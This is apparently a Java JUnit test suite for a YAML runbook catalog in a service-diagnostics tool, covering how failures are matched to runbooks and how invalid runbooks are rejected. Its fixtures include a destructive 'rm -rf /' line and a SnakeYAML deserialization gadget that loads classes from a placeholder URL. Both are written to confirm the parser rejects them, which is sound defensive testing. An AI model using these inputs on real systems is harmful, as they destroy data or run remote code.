package com.relayaegis.diagnostics.runbook;

import static com.relayaegis.diagnostics.DiagnosticFixtures.APP;
import static com.relayaegis.diagnostics.DiagnosticFixtures.ctx;
import static com.relayaegis.diagnostics.DiagnosticFixtures.healthy;
import static com.relayaegis.diagnostics.DiagnosticFixtures.running;
import static com.relayaegis.diagnostics.DiagnosticFixtures.serverErrors;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import com.relayaegis.diagnostics.DiagnosticEngine;
import com.relayaegis.diagnostics.DiagnosticFinding;
import com.relayaegis.diagnostics.DiagnosticResult;
import com.relayaegis.diagnostics.EvidenceCorrelationEngine;
import com.relayaegis.diagnostics.FailurePatternRegistry;
import com.relayaegis.recovery.RecoveryActionType;
import com.relayaegis.runtime.LogExcerpt;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.Set;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

class RunbookTest {
    /** The runbooks shipped in the repository's runbooks/ folder (Maven runs from backend/). */
    private static final Path SHIPPED = Path.of("..", "runbooks");

    @TempDir Path dir;

    private static LogExcerpt lines(String... text) { return new LogExcerpt(APP, true, null, List.of(text), List.of()); }

    private static DiagnosticEngine engineWith(RunbookCatalog catalog) {
        EvidenceCorrelationEngine correlation = new EvidenceCorrelationEngine(null, null, null, null, null, null, null, null, null, null);
        return new DiagnosticEngine(new FailurePatternRegistry(List.of(), catalog), correlation);
    }

    private static RunbookCatalog catalog(Path directory) {
        RunbookCatalog catalog = new RunbookCatalog(directory, Set.copyOf(FailurePatternRegistry.builtIns().stream().map(p -> p.id()).toList()));
        catalog.reload();
        return catalog;
    }

    @Test
    void theShippedRunbooksAllLoad() {
        RunbookCatalog catalog = catalog(SHIPPED);
        assertTrue(catalog.statuses().stream().allMatch(RunbookCatalog.Status::loaded), catalog.statuses().toString());
        assertTrue(catalog.runbooks().stream().anyMatch(r -> r.id().equals("connection-pool-exhausted")));
        assertTrue(catalog.runbooks().stream().anyMatch(r -> r.id().equals("disk-full")));
    }

    @Test
    void connectionPoolExhaustionIsDiagnosedFromTheRunbookAndOutranksTheGeneric5xxPattern() {
        DiagnosticResult result = engineWith(catalog(SHIPPED)).diagnose(ctx().runtime(running(APP)).checks(serverErrors(503))
                .logs(lines("GET /orders", "HikariPool-1 - Connection is not available, request timed out after 30000ms")).build());

        DiagnosticFinding top = result.ranked().get(0);
        assertEquals("connection-pool-exhausted", top.patternId());
        assertEquals(RecoveryActionType.RESTART_CONTAINER, top.action());
        assertEquals(APP, top.actionTarget());
        assertTrue(top.supporting().stream().anyMatch(r -> r.source().equals("logs") && r.summary().contains("HikariPool-1")));
        assertTrue(top.supporting().stream().anyMatch(r -> r.source().equals("health_check")));
        assertTrue(top.explanation().contains("connection-pool-exhausted.yaml"), "the finding names the runbook file and version");
        assertTrue(result.ranked().stream().anyMatch(f -> f.patternId().equals("http-5xx") || f.category().equals("http")),
                "the built-in patterns still run alongside runbooks");
    }

    @Test
    void diskFullEscalatesInsteadOfRestarting() {
        DiagnosticResult result = engineWith(catalog(SHIPPED)).diagnose(ctx().runtime(running(APP)).checks(serverErrors(500))
                .logs(lines("Error: ENOSPC: no space left on device, write '/data/orders.json'")).build());

        DiagnosticFinding diskFull = result.ranked().stream().filter(f -> f.patternId().equals("disk-full")).findFirst().orElseThrow();
        assertEquals(RecoveryActionType.ESCALATE, diskFull.action());
        assertEquals("disk-full", result.ranked().get(0).patternId());
    }

    @Test
    void aRunbookNeverMatchesAHealthyApplicationOrMissingEvidence() {
        DiagnosticEngine engine = engineWith(catalog(SHIPPED));
        DiagnosticResult healthyApp = engine.diagnose(ctx().runtime(running(APP)).checks(healthy())
                .logs(lines("HikariPool-1 - Connection is not available, request timed out after 30000ms")).build());
        DiagnosticResult noLogs = engine.diagnose(ctx().runtime(running(APP)).checks(serverErrors(503)).build());

        assertTrue(healthyApp.ranked().stream().noneMatch(f -> f.patternId().equals("connection-pool-exhausted")));
        assertTrue(noLogs.ranked().stream().noneMatch(f -> f.patternId().equals("connection-pool-exhausted")));
    }

    @Test
    void aNewFailureTypeIsHandledByAddingAFileWithNoCodeChange() throws Exception {
        RunbookCatalog catalog = catalog(dir);
        DiagnosticEngine engine = engineWith(catalog);
        var context = ctx().runtime(running(APP)).checks(serverErrors(502)).logs(lines("upstream sent too big header while reading response header")).build();
        assertTrue(engine.diagnose(context).ranked().stream().noneMatch(f -> f.patternId().equals("proxy-header-too-big")));

        Files.writeString(dir.resolve("proxy-header-too-big.yaml"), """
                id: proxy-header-too-big
                title: Reverse proxy rejected an oversized header
                confidence: 0.9
                cause: The reverse proxy rejects the upstream response because a header exceeds its buffer.
                match:
                  healthCheck: { statusCodes: [502] }
                  logs: { patterns: ['too big header'] }
                action:
                  type: ESCALATE
                  text: Raise proxy_buffer_size or shrink the cookies the application sets.
                """);
        catalog.reload();

        DiagnosticFinding top = engine.diagnose(context).ranked().get(0);
        assertEquals("proxy-header-too-big", top.patternId());
        assertEquals(RecoveryActionType.ESCALATE, top.action());
    }

    @Test
    void invalidFilesAreRejectedWithReasonsAndDoNotStopTheOthers() throws Exception {
        Files.writeString(dir.resolve("a-good.yaml"), """
                id: good-one
                title: Good
                confidence: 0.8
                cause: x
                match: { logs: { patterns: ['boom'] } }
                action: { type: INVESTIGATE, text: look }
                """);
        Files.writeString(dir.resolve("b-bad.yaml"), """
                id: Bad Id
                title: Bad
                confidence: 2
                cause: x
                command: rm -rf /
                match: { failing: false, logs: { patterns: ['(unclosed'] } }
                action: { type: RUN_SCRIPT, text: no }
                """);
        Files.writeString(dir.resolve("c-builtin.yaml"), """
                id: oom-killed
                title: Clash
                confidence: 0.8
                cause: x
                match: { logs: { patterns: ['x'] } }
                action: { type: INVESTIGATE, text: look }
                """);
        RunbookCatalog catalog = catalog(dir);

        assertEquals(List.of("good-one"), catalog.runbooks().stream().map(Runbook::id).toList());
        List<String> bad = catalog.statuses().stream().filter(s -> s.source().equals("b-bad.yaml")).findFirst().orElseThrow().problems();
        assertTrue(bad.stream().anyMatch(p -> p.startsWith("id:")), bad.toString());
        assertTrue(bad.stream().anyMatch(p -> p.startsWith("confidence:")), bad.toString());
        assertTrue(bad.stream().anyMatch(p -> p.equals("command: unknown field")), bad.toString());
        assertTrue(bad.stream().anyMatch(p -> p.contains("invalid regular expression")), bad.toString());
        assertTrue(bad.stream().anyMatch(p -> p.contains("unknown action 'RUN_SCRIPT'")), bad.toString());
        assertTrue(catalog.statuses().stream().anyMatch(s -> s.source().equals("c-builtin.yaml") && !s.loaded()
                && s.problems().get(0).contains("already used")));
    }

    @Test
    void mutatingActionsNeedAFailingAppAndTheRightTarget() {
        var noFailing = assertThrows(RunbookParser.InvalidRunbook.class, () -> RunbookParser.parse("""
                id: restart-healthy
                title: x
                confidence: 0.8
                cause: x
                match: { failing: false, container: { running: true } }
                action: { type: RESTART_CONTAINER, text: x }
                """, "t.yaml"));
        assertTrue(noFailing.problems().stream().anyMatch(p -> p.startsWith("match.failing")));

        var dependencyOnApp = assertThrows(RunbookParser.InvalidRunbook.class, () -> RunbookParser.parse("""
                id: dep-restart
                title: x
                confidence: 0.8
                cause: x
                match: { logs: { patterns: ['x'] } }
                action: { type: RESTART_DEPENDENCY, text: x }
                """, "t.yaml"));
        assertTrue(dependencyOnApp.problems().stream().anyMatch(p -> p.contains("must target matched-dependency")));
    }

    @Test
    void yamlTagsCannotConstructObjects() {
        var error = assertThrows(RunbookParser.InvalidRunbook.class, () -> RunbookParser.parse(
                "id: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://example.invalid\"]]]]\n", "t.yaml"));
        assertTrue(error.getMessage().startsWith("not valid YAML"), error.getMessage());
    }

    @Test
    void aDependencyRunbookTargetsTheMatchedDependency() throws Exception {
        Runbook runbook = RunbookParser.parse("""
                id: cache-down
                title: Cache down
                confidence: 0.9
                cause: The cache is down.
                match:
                  dependency: { name: redis }
                  logs: { patterns: ['Unable to connect to Redis'] }
                action: { type: RESTART_DEPENDENCY, target: matched-dependency, text: Restart the cache. }
                """, "cache.yaml");
        var context = ctx().runtime(running(APP)).checks(serverErrors(500))
                .dependency(com.relayaegis.diagnostics.DiagnosticFixtures.dependency("redis", com.relayaegis.diagnostics.DiagnosticFixtures.exited("redis", 1)))
                .logs(lines("Unable to connect to Redis at redis:6379")).build();

        DiagnosticFinding finding = runbook.evaluate(context).orElseThrow();

        assertEquals("redis", finding.actionTarget());
        assertFalse(finding.supporting().isEmpty());
    }
}
